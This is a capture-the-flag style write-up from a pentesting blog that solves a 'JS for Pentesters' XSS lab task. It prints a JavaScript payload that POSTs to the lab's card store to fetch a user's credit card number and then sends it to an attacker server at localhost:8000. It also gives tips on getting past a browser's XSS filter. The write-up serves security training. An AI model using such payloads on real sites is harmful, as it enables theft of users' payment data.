

##
#
https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/
#
##

XSS - Ex-filtrating data with XMLHttpRequest(): JS for Pentesters task 15 write up
Nov 1, 2014 • jsp, javascript, xss, security-tube

writeup for task-15 of the JS for pentesters series by security-tube - Ex-filtrating data with XMLHttpRequest()
Till now we have seen 2 different challenges with XMLHttpRequest() with GET request. Now let us look into a challenge were we need to post data not by GET method but by POST method. Let us look into the challenge:

JS for Pentesters task 15

Our Objective of the challenge is to Find John’s Credit Card Number using an XSS vulnerability on this page and post the Credit Card Number to your Attacker Server. Here as we stated above, the key difference is that we should do a POST request to the server. Let us look into the correct payload:

```
    <script>
    var xhr = new XMLHttpRequest();    
    xhr.open('POST', 'http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
    var request = new XMLHttpRequest();
    request.open('GET', 'http://localhost:8000/?creditcard='+xhr.responseText, true);
    request.send()
    };
    xhr.send('user=john');
    </script>
```

So what have we done above ? We have created a new XMLHttpRequest() object and then we opened the link by specifying the request type as POST. Then we used the setRequestHeader() so that the entire URL should be properly encoded or else it won’t work. After that, its all normal procedure like we did before. A small difference is that we are declaring one more XMLHttpRequest() object inside the onload since we need to post it our server also. You can do that without XMLHttpRequest too but I just prefer to use it. In the xhr.send(), inside the brackets, we gave the POST parameters and here, it is user=john.

Note:

1) If you didn’t understand the payload properly, I strongly recommend you read the basics of XMLHttpRequest() first and then try again.

2) While playing with XSS challenges, it is always recommended to use Mozilla Firefox because Google chrome has inbuilt XSS stopper which will stop us from executing arbitrary JavaScript code even if the page is vulnerable to XSS. So its strongly recommended to use Firefox instead of chrome.

3) You have to URL encode the payload before the injection via the url parameter or else this will fail to work

We hope that you really liked this challenge. If there is anything you didn’t understand or wanted to get more clarity, please comment down and we are more than happy to help. Also, if you get a better way of solving the challenge, please share it with us and we are happy to learn from our readers too. Happy pentesting..
